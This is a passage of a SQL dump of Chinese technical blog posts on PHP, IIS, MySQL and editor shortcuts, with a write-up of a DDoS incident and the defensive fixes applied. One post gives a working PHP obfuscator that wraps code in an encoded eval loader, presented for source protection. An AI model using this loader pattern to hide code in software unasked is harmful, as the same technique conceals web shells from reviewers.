\r\n}&lt;/pre&gt;&lt;p&gt;注意：初始化调用父类Model类的构造方法，加了一个参数：888，这个代表该数据库连接的id，指定活动库的连接id为固定的888（默认mongo的连接id为999）&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;其他活动用的类继承该活动父类，便可以直接调用thinkphp提供的数据库操作方法，并且读写只在10.1.80.28这一台数据库上。&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386855175),
(61, 61, '&lt;p&gt;&lt;br /&gt;Ctrl+W 关闭当前页签，很通用。&lt;br /&gt;Ctrl+Shift+W关闭所有页签，估计能猜到。&lt;br /&gt;&lt;br /&gt;Ctrl+Shift+v 粘贴并且格式化，比较实用。&lt;br /&gt;&lt;br /&gt;Ctrl+[ 减少缩进&lt;br /&gt;Ctrl+] 增加缩进&lt;br /&gt;&lt;br /&gt;Ctrl+k,Ctrl+u 先按Ctrl+K,再按Ctrl+U，大写，这有点不习惯&lt;br /&gt;Ctrl+k,Ctrl+l 小写&lt;br /&gt;&lt;br /&gt;ctrl+left,ctrl+right 先左/右移动一个单词，VI中的W,B&lt;br /&gt;&lt;br /&gt;Ctrl+Shift+up ,当前上上移一行，跟Eclipse一样&lt;br /&gt;Ctrl+Shift+down，不说了&lt;br /&gt;&lt;br /&gt;Ctrl+Shift+K 删除当前选中行，后来发现Ctrl+X也可以，Eclipse里面的Ctrl+D。&lt;br /&gt;Ctrl+Shift+D 复制当前选中行，程序员的挚爱&lt;br /&gt;Ctrl+D 是高亮光标所在词，类似VIM中的#&lt;br /&gt;&lt;br /&gt;Ctrl+M 到匹配的{[( 与vim 中的%一致&lt;br /&gt;Ctrl+Shift+M 可以选中{[(内容，类似vim中的va( vi{&lt;br /&gt;&lt;br /&gt;Ctrl+J join rows 合并选中行&lt;br /&gt;Ctrl+Shift+J 打散行&lt;br /&gt;&lt;br /&gt;Ctrl+Shift+T 旋转功能这个标签内容 vim中的vat&lt;br /&gt;Ctrl+shift+a 选中匹配的标签&lt;br /&gt;&lt;br /&gt;Ctrl+T 可以选中多行，然后讲这些行顺序反转。如果没有选中多行，会讲光标前后的字母换顺序。&lt;br /&gt;&lt;br /&gt;双击选中一个单词,Ctrl+F3跳至下一个匹配处，F3上一个匹配处。&lt;br /&gt;&lt;br /&gt;F11，我最喜欢的全屏快捷键。&lt;br /&gt;Shift+F11更狠，只编辑当前的文件。免打扰模式。两耳清静。&lt;br /&gt;&lt;br /&gt;alt+. 如果输入&amp;lt;div&amp;gt; 然后alt+. 可以自动完成这个tag，变成&amp;lt;div&amp;gt;&amp;lt;/div&amp;gt;&lt;br /&gt;&lt;br /&gt;Ctrl+/ Ctrl+Shift+/ 注释/取消注释，各种语言都行。&lt;br /&gt;&lt;br /&gt;一个小技巧：选中一个单词如abc ，然后输入&amp;quot; 这样 会变成&amp;quot;abc&amp;quot;,同理还可以用( { [ &amp;#39;&lt;br /&gt;&lt;br /&gt;Ctrl+shift+P 调出一个功能列表，可以探索一些好玩的功能，比如我找到了这个功能：HTML:Encoding Special Characters。选中 &amp;amp; 运行一下可以变成 &amp;amp;amp;&lt;br /&gt;&lt;br /&gt;Ctrl+P 会调出一个对话框框，下拉选项中有当前打开的文件，可以切换，文本框非常强大，输入@funcName 可以直接到函数定义处，输入#key 可以直接查找，输入:行数可以直接到某行，也可以用快捷键Ctrl+g&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;Ctrl+alt+Enter,zencoding开始了 or tab&lt;br /&gt;alt+shift+W 环绕选中内容&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;===&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Ctrl+Shift+v 粘贴并且格式化，比较实用。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Ctrl+Shift+up ,当前上上移一行&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Ctrl+Shift+K 删除当前选中行，后来发现Ctrl+X也可以，Eclipse里面的Ctrl+D。&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Ctrl+Shift+D 复制当前选中行，程序员的挚爱&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Ctrl+D 是高亮光标所在词，类似VIM中的#&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;alt+. 如果输入&amp;lt;div&amp;gt; 然后alt+. 可以自动完成这个tag，变成&amp;lt;div&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386855275),
(62, 62, '&lt;p&gt;Terminal&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;cd php-5.3.6/ext/mysqli\r\n/usr/local/webserver/php/bin/phpize\r\n./configure --with-php-config=/usr/local/webserver/php/bin/php-config\r\nmake\r\nmake instal&lt;/pre&gt;&lt;p&gt;报错：&lt;br /&gt;checking for MySQLi support... yes&lt;br /&gt;checking whether to enable embedded MySQLi support... no&lt;br /&gt;mysql_config not found&lt;br /&gt;configure: error: Please reinstall the mysql distribution&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;加入配置&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;./configure --with-php-config=/usr/local/webserver/php/bin/php-config --with-mysqli=/usr/local/mysql/bin/mysql_config&lt;/pre&gt;&lt;p&gt;编译通过&lt;/p&gt;&lt;p&gt;将生成的mysqli.so配置加入php.ini中&lt;/p&gt;&lt;p&gt;extension=mysqli.so&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1387681482);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(63, 63, '&lt;p&gt;IIS6、7支持以fastcgi方式运行php程序&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;安装php&lt;/p&gt;&lt;p&gt;下载：&lt;a href=&quot;http://blog.csdn.net/luochuan/article/details/windows.php.net//downloads/releases/php-5.3.19-nts-Win32-VC9-x86.msi&quot; target=&quot;_blank&quot;&gt;windows.php.net//downloads/releases/php-5.3.19-nts-Win32-VC9-x86.msi&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安装过程中选择iisfastcgi方式安装 &amp;nbsp;&lt;/p&gt;&lt;p&gt;如果没有安装IIS FASTCGI的 下一步会提示没有安装的，下载安装就行了&lt;/p&gt;&lt;p&gt;FastCGI &amp;nbsp;for IIS 6 &amp;nbsp;7 &amp;nbsp; &lt;a href=&quot;http://www.iis.net/expand/fastcgi&quot; target=&quot;_blank&quot;&gt;http://www.iis.net/expand/fastcgi&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安装好之后继续下一步，默认安装到c:/Program Files/PHP目录&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;配置IIS&lt;/p&gt;&lt;p&gt;cmd命令行&lt;/p&gt;&lt;p&gt;&amp;gt;&lt;span style=&quot;color:#0000ff&quot;&gt;cd C:WINDOWSsystem32inetsrv&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;gt;&lt;span style=&quot;color:#0000ff&quot;&gt;cscript fcgiconfig.js -add -section:&amp;quot;PHP&amp;quot; -extension:php -path:&amp;quot;C:Program FilesPHPphp-cgi.exe&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;注意：path:&amp;quot;xxxxphp-cgi.exe&rdquo; 是你安装php的目录&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;gt; &lt;span style=&quot;color:#0000ff&quot;&gt;cscript fcgiconfig.js -set -section:&amp;quot;PHP&amp;quot; -InstanceMaxRequests:10000&lt;br /&gt;&lt;/span&gt;&amp;gt; &lt;span style=&quot;color:#0000ff&quot;&gt;cscript fcgiconfig.js -set -section:&amp;quot;PHP&amp;quot; -EnvironmentVars:PHP_FCGI_MAX_REQUESTS:10000&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;控制面板-管理工具-internet信息服务，进入到网站-localhost目录 右键属性，配置好网站、主目录、文档&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：主目录下要配置开始位置的&ldquo;配置&rdquo;选项，添加-&amp;gt;可执行文件选择php-cgi.exe位置，扩展名写.php 确定&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;命令行 net stop w3svc停止iis服务 &amp;nbsp; net start w3svc开启iis服务&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386855439),
(64, 64, '&lt;p&gt;首先看Mysql错误日志，日志位置：./mysql/data/mysql_error.log&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;121203 13:13:44 [ERROR] Can&#039;t start server: Bind on TCP/IP port: No such file or directory \r\n121203 13:13:44 [ERROR] Do you already have another mysqld server running on port: 3306 ? \r\n121203 13:13:44 [ERROR] Aborting&lt;/pre&gt;&lt;p&gt;从日志可以看到报错信息为3306端口被占用&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;开始-运行-cmd进入命令行模式查看3306端口的占用情况&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;&amp;gt;netstat -aon|findstr &quot;3306&quot; \r\n&amp;gt;TCP 10.1.49.221:3306 74.125.128.17:443 ESTABLISHED 3468&lt;/pre&gt;&lt;p&gt;可以看到3306端口被占用，进程ID为3468 &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;最后taskkill /f /pid 3468杀掉当前进程，启动Mysql，万事大吉&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386855617),
(65, 65, '&lt;p&gt;Windows系统下，PHP5.3以上的版本已经不支持mssql扩展，所以如果你需要和sql server通信需要下载微软公司专门为PHP提供的sqlserver驱动&lt;/p&gt;&lt;h1 id=&quot;top&quot;&gt;&lt;span style=&quot;font-size:14px&quot;&gt;Microsoft Drivers 3.0 for PHP for SQL Server&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;下载地址：&lt;a target=&quot;_blank&quot; href=&quot;http://www.microsoft.com/en-us/download/details.aspx?id=20098&quot;&gt;http://www.microsoft.com/en-us/download/details.aspx?id=20098&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;下载之后，安装解压，根据你安装的PHP版本将相应的dll文件复制到php安装目录的ext目录下，然后打开php.ini，加入以下配置&lt;/p&gt;&lt;p&gt;[PHP_PDO_SQLSRV]&lt;br /&gt;extension=php_pdo_sqlsrv_53_nts_vc9.dll&lt;br /&gt;[PHP_SQLSRV]&lt;br /&gt;extension=php_sqlsrv_53_nts_vc9.dll&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;上面的两个dll根据你复制的dll文件做相应修改，配置好之后重启IIS和PHP FASTCGI进程&lt;/p&gt;&lt;p&gt;最后根据驱动包手册里的例子写段程序测试下&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386855694),
(66, 66, '&lt;p&gt;首先打个广告，我们的网站人人围，一个社交、新闻分发平台：&lt;a target=&quot;_blank&quot; href=&quot;http://www.renrenwei.com/&quot;&gt;http://www.renrenwei.com/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;服务器架构：nginx+mysql+mongodb+php，用户登录信息session存在mongodb中&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;受攻击情况：&lt;/p&gt;&lt;p&gt;11-23号左右开始持续一周的DDOS攻击，有大量的北京、广东、海外的IP不停的刷网站的注册信息，两三天内注册用户数量达到7-8万，由于IP不同，所以无法用IP黑名单的方法禁止访问与注册&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;受攻击结果：&lt;/p&gt;&lt;p&gt;由于并发请求量太大，又受限于网站服务器性能，人人围网站一度瘫痪，数据库连接超时，mongodb存在大量过期session数据，垃圾数据超级多，导致session集合数据量达到千万级别，session的更新超级缓慢。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;原因排查过程：&lt;/p&gt;&lt;p&gt;查看nginx访问日志，可以看到大量无意义的网络请求，查看mongodb运行日志，可以看到对session集合的读取操作超级慢，注销session用时甚至达到100S+&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;解决办法：&lt;/p&gt;&lt;p&gt;优化mongodb索引机制，重建索引并优化索引项&lt;br /&gt;&lt;/p&gt;&lt;p&gt;优化session回收机制，服务器加入定时清除session集合过期session值，清除包括空数据文档，过期数据文档等&lt;/p&gt;&lt;p&gt;修改前端验证码机制，加入更难识别的验证码&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386855943),
(67, 67, '&lt;p&gt;PHP默认识别的数据类型是application/x-www.form-urlencoded标准的数据类型，我们在接收这种常规的数据类型的时候可以用全局数组$_REQUEST、$_POST或者$_GET来获取客户端请求的数据。&lt;/p&gt;&lt;p&gt;如果遇到未识别MIME类型的请求数据，如Content-Type=text/xml 类型或者直接POST一个JSON数据流，那么PHP要怎么获取数据呢，PHP文档里是这么描述的：&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;The RAW / uninterpreted HTTP POST information can be accessed with: &amp;nbsp; $GLOBALS[&amp;#39;HTTP_RAW_POST_DATA&amp;#39;] This is useful in cases where the post Content-Type is not something PHP understands (such as text/xml).&lt;br /&gt;&lt;br /&gt;由于PHP默认只识别application/x-www.form-urlencoded标准的数据类型，因此，对型如text/xml的内容无法解析为$_POST数组，故保留原型，交给$GLOBALS[&amp;#39;HTTP_RAW_POST_DATA&amp;#39;] （$HTTP_RAW_POST_DATA）来接收。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：此变量仅在碰到未识别 MIME 类型的数据时产生，$HTTP_RAW_POST_DATA 对于 enctype=&amp;quot;multipart/form-data&amp;quot; 表单数据不可用。&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;其实php://input也可以用来接收数据&lt;/p&gt;&lt;p&gt;我们来看下描述，php://input 允许读取 POST 的原始数据。和 $HTTP_RAW_POST_DATA 比起来，它给内存带来的压力较小，并且不需要任何特殊的 php.ini 设置&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：php://input 不能用于 enctype=&amp;quot;multipart/form-data&amp;quot;。 &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;代码示例：&lt;/p&gt;test.html&lt;pre class=&quot;brush:html;toolbar:false;&quot;&gt;&amp;lt;form action=&quot;post.php&quot; method=&quot;post&quot;&amp;gt;    \r\n  &amp;lt;input type=&quot;text&quot; name=&quot;user&quot;&amp;gt;    \r\n  &amp;lt;input type=&quot;password&quot; name=&quot;password&quot;&amp;gt;    \r\n  &amp;lt;input type=&quot;submit&quot;&amp;gt;    \r\n&amp;lt;/form&amp;gt;&lt;/pre&gt;&lt;p&gt;PHP接收数据&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n    echo file_get_contents(&quot;php://input&quot;); \r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考链接：&lt;a target=&quot;_blank&quot; href=&quot;http://www.cnblogs.com/xwblog/archive/2011/12/23/2299672.html&quot;&gt;http://www.cnblogs.com/xwblog/archive/2011/12/23/2299672.html&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386856067),
(68, 68, '&lt;p&gt;SQLServer2008的image字段类型支持将图片、文本文件等直接存入数据库，image类型是以十六进制的格式存储的，所以我们想把图片直接写入数据库，只需要以二进制流的方式读取要存储的图片然后转为十六进制字符串存入数据库即可。&lt;/p&gt;&lt;p&gt;具体过程：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n$image = &quot;test.jpg&quot;; \r\n//打开图片，b参数是为兼容windows系统 \r\n$fp = fopen($image, &quot;rb&quot;); \r\n//读取图片内容 \r\n$content = fread($fp, filesize($image)); \r\n//将内容字符串转为十六进制字符串 \r\n$content = &quot;0x&quot;.bin2hex($content);&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;php连接SQLServer代码不做介绍&lt;/p&gt;&lt;p&gt;得到上面的图片内容之后，可以使用下面的sql语句将内容写入数据库&lt;/p&gt;&lt;pre class=&quot;brush:sql;toolbar:false;&quot;&gt;INSERT INTO TABLE (testimage) values($content)&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：$content不要加单引号(&amp;#39;)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386856199),
(69, 69, '&lt;p&gt;&lt;strong&gt;环境&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;Windows Server 2003，IIS 6.0&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;strong&gt;现象&lt;/strong&gt;&lt;br /&gt;访问网站出现&ldquo;Service Unavailable&rdquo;错误 &lt;br /&gt;&lt;br /&gt;&lt;strong&gt;解决方案 &lt;br /&gt;&lt;/strong&gt;给用户NETWORK SERVICE加上访问IIS服务的权限 &lt;br /&gt;&lt;br /&gt;&lt;p&gt;开始 - 控制面板 - 管理工具 - 组件服务 - 计算机 - 我的电脑 - DCOM - IIS ADMIN SERVICE - 属性 - 安全 - 启动和激活权限 - 自定义 - 添加帐号&ldquo;NETWORK SERVICE&rdquo;，给该帐号赋予&ldquo;本地启动&rdquo;和&ldquo;本地激活&rdquo;的权限 - 在cmd下输入&ldquo;IISRESET&rdquo;命令（不含引号）重新启动IIS&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386856339),
(70, 70, '&lt;p&gt;&lt;span style=&quot;font-size:24px&quot;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:24px&quot;&gt;&lt;strong&gt;urlencode/urldecode方式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\nfunction RandAbc($length=&quot;&quot;){//返回随机字符串\r\n    $str=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;\r\n    return str_shuffle($str);\r\n}\r\n                                           \r\n$filename=&#039;foo.php&#039;;\r\n                                           \r\n$T_k1=RandAbc();//随机密匙1\r\n$T_k2=RandAbc();//随机密匙2\r\n                                           \r\n$vstr=file_get_contents($filename);//要加密的文件\r\n$v1=base64_encode($vstr);\r\n                                           \r\n$c=strtr($v1,$T_k1,$T_k2);//根据密匙替换对应字符。\r\n$c=$T_k1.$T_k2.$c;\r\n                                           \r\n$q1=&quot;O00O0O&quot;;\r\n$q2=&quot;O0O000&quot;;\r\n$q3=&quot;O0OO00&quot;;\r\n$q4=&quot;OO0O00&quot;;\r\n$q5=&quot;OO0000&quot;;\r\n$q6=&quot;O00OO0&quot;;\r\n$s=&#039;$&#039;.$q6.&#039;=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$&#039;.$q1.&#039;=$&#039;.$q6.&#039;{3}.$&#039;.$q6.&#039;{6}.$&#039;.$q6.&#039;{33}.$&#039;.$q6.&#039;{30};$&#039;.$q3.&#039;=$&#039;.$q6.&#039;{33}.$&#039;.$q6.&#039;{10}.$&#039;.$q6.&#039;{24}.$&#039;.$q6.&#039;{10}.$&#039;.$q6.&#039;{24};$&#039;.$q4.&#039;=$&#039;.$q3.&#039;{0}.$&#039;.$q6.&#039;{18}.$&#039;.$q6.&#039;{3}.$&#039;.$q3.&#039;{0}.$&#039;.$q3.&#039;{1}.$&#039;.$q6.&#039;{24};$&#039;.$q5.&#039;=$&#039;.$q6.&#039;{7}.$&#039;.$q6.&#039;{13};$&#039;.$q1.&#039;.=$&#039;.$q6.&#039;{22}.$&#039;.$q6.&#039;{36}.$&#039;.$q6.&#039;{29}.$&#039;.$q6.&#039;{26}.$&#039;.$q6.&#039;{30}.$&#039;.$q6.&#039;{32}.$&#039;.$q6.&#039;{35}.$&#039;.$q6.&#039;{26}.$&#039;.$q6.&#039;{30};eval($&#039;.$q1.&#039;(&quot;&#039;.base64_encode(&#039;$&#039;.$q2.&#039;=&quot;&#039;.$c.&#039;&quot;;eval(&#039;?&amp;gt;&#039;.$&#039;.$q1.&#039;($&#039;.$q3.&#039;($&#039;.$q4.&#039;($&#039;.$q2.&#039;,$&#039;.$q5.&#039;*2),$&#039;.$q4.&#039;($&#039;.$q2.&#039;,$&#039;.$q5.&#039;,$&#039;.$q5.&#039;),$&#039;.$q4.&#039;($&#039;.$q2.&#039;,0,$&#039;.$q5.&#039;))));&#039;).&#039;&quot;));&#039;;\r\n                                           \r\n$s=&#039;&amp;lt;?php\r\n&#039;.$s.&#039;\r\n?&amp;gt;&#039;;\r\n                                           \r\necho $s;\r\n//生成 加密后的PHP文件\r\n$fpp1 = fopen(&#039;temp&#039;.$filename,&#039;w&#039;);\r\nfwrite($fpp1,$s) or die(&#039;写文件错误&#039;);&lt;/pre&gt;&lt;p&gt;新建encrypt.php文件，将以上代码复制进该文件，$filename是要加密的php文件&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px;color:#cc0000&quot;&gt;&lt;strong&gt;例&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;原foo.php&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\n                                 \r\necho phpinfo();&lt;/pre&gt;&lt;p&gt;加密之后tempfoo.php&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\n$O00OO0=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O(&quot;JE8wTzAwMD0iQlpQQWZ2bWppVVh4Y05rclFUeldKb3REZXVHYnlNU3FzaENwZEZnSUtSVkhZbkxFYXdsT3Z1TUVOcGZCREpoT3pzYWVWcmlIUWJLQ2xBR1RJUldVdFp5ZGdGUHdvbmN4bWtqTFlxWFNNQzlxWXhFc3lQMG91SHNiVEl2cVl4dmRUZnVwb3lhNyI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=&quot;));\r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:24px&quot;&gt;&lt;strong&gt;php_screw方式&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;下载：&lt;a target=&quot;_blank&quot; href=&quot;http://pan.baidu.com/share/link?shareid=180128&amp;amp;uk=704879932&quot;&gt;http://pan.baidu.com/share/link?shareid=180128&amp;amp;uk=704879932&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;安装 &lt;/p&gt;&lt;p&gt;1.用tar解压缩 tar -zxvf php_screw-1.5.tar.gz&lt;/p&gt;&lt;p&gt;2.进入php_screw-1.5目录开始安装 &lt;/p&gt;&lt;p&gt;cd php_screw-1.5&lt;/p&gt;&lt;p&gt;phpize&lt;/p&gt;&lt;p&gt;关于phpize ,它在php5-dev扩展模块中 只要安装php5-dev模块就行了。&lt;/p&gt;&lt;p&gt;./confiugre&lt;/p&gt;&lt;p&gt;3.设置自己用来加密的密码 &lt;/p&gt;&lt;p&gt;vi my_screw.h&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;-- Please change the encryption SEED key (pm9screw_mycryptkey) into the&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; values according to what you like.&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; The encryption will be harder to break, if you add more values to the&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; encryption SEED array. However, the size of the SEED is unrelated to&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; the time of the decrypt processing.&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;* &amp;nbsp;If you can read and understand the source code, to modify an original&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; encryption logic will be possible. But in general, this should not&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; be necessary.&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;OPTIONAL: Encrypted scripts get a stamp added to the beginning of the&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;file. If you like, you may change this stamp defined by&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;PM9SCREW and PM9SCREW_LEN in php_screw.h. PM9SCREW_LEN must&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;be less than or equal to the size of PM9SCREW.&lt;/p&gt;&lt;p&gt;4.编译 &lt;/p&gt;&lt;p&gt;make&lt;/p&gt;&lt;p&gt;5.拷贝modules目录下的php_screw.so文件到/usr/lib/php5/extension目录下 &lt;/p&gt;&lt;p&gt;cp modules/php_screw.so /usr/lib/php5/extension/&lt;/p&gt;&lt;p&gt;6.编辑php.ini文件 &lt;/p&gt;&lt;p&gt;在php.ini文件里，加入如下语句 &lt;/p&gt;&lt;p&gt;extension=php_screw.so&lt;/p&gt;&lt;p&gt;7.重新启动Apache &lt;/p&gt;&lt;p&gt;/etc/init.d/apache2 restart&lt;/p&gt;&lt;p&gt;8.编译加密工具 &lt;/p&gt;&lt;p&gt;cd tools&lt;/p&gt;&lt;p&gt;make&lt;/p&gt;&lt;p&gt;9.将tools目录下加密用的工具screw拷贝到适当目录 &lt;/p&gt;&lt;p&gt;cp screw /usr/bin/&lt;/p&gt;&lt;p&gt;经过以上的10步，就已经把php_screw-1.5全部安装完成了。并且现在的php也已经支持解释加密过的php文件了 &lt;/p&gt;&lt;p&gt;使用 &lt;/p&gt;&lt;p&gt;1.现写一个要加密的php文件。 &lt;/p&gt;&lt;p&gt;我写了如下的一个用来测试php速度的test.php文件 &lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\n$a=0;\r\n$t=time();\r\nfor($i=0;$i&amp;lt;5000000;$i++) {\r\n    $a=$a*$i;\r\n}\r\n$t1=time();\r\necho &quot;&amp;lt;p&amp;gt;&quot;;\r\necho &quot;It used:&quot;;\r\necho $t1-$t;\r\necho &quot;seconds&quot;;\r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;将上面的test.php文件放到/var/www/目录下。通过浏览器访问，将显示出php在大量计算时的速度（粗略估计） &lt;/p&gt;&lt;p&gt;2.将我们写的php文件加密 